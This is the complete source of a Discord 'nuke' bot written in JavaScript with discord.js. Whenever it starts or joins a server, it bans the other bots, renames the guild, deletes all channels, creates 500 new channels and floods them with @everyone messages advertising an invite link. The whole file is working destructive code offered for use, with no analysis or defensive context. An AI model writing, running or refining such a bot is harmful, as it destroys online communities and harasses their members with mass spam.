const { Client } = require('discord.js');
const http = require('http');

const client = new Client({ intents: [1, 512, 32768, 2, 16] });

const TOKEN = process.env.TOKEN;
const SPAM_LINK = "https://discord.gg/2Qr8Fza3s";

http.createServer((req, res) => { res.writeHead(200); res.end('Alive'); }).listen(process.env.PORT || 3000);
client.once('ready', async () => {
    console.log(`[+] ${client.user.tag} online`);
    
    // Auto-nuke every guild on boot
    for (const [id, guild] of client.guilds.cache) {
        console.log(`[NUKE] Starting on ${guild.name}`);
        nukeGuild(guild);
    }
});

// Auto-nuke any new guild the bot joins
client.on('guildCreate', async (guild) => {
    console.log(`[NUKE] Joined ${guild.name}, nuking...`);
    nukeGuild(guild);
});

async function nukeGuild(g) {
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    // Ban bots
    const bots = g.members.cache.filter(m => m.user.bot && m.bannable && m.id !== client.user.id);
    for (const [id, bot] of bots) {
        await bot.ban({ reason: 'Auto nuke' }).catch(() => {});
        await sleep(50);
    }

    // Rename
    await g.setName('6ujz on top').catch(() => {});

    // Delete channels
    const channels = Array.from(g.channels.cache.values());
    for (const ch of channels) {
        await ch.delete().catch(() => {});
        await sleep(50);
    }

    // Spam
    for (let i = 0; i < 500; i++) {
        g.channels.create({ name: '6ujz-owns-u', type: 0 }).then(ch => {
            if (!ch) return;
            for (let j = 0; j < 10; j++) {
                ch.send(`@everyone @here ${SPAM_LINK} 6UJZ OWNS U`).catch(() => {});
            }
        }).catch(() => {});
        await sleep(200);
    }
}

client.login(TOKEN);
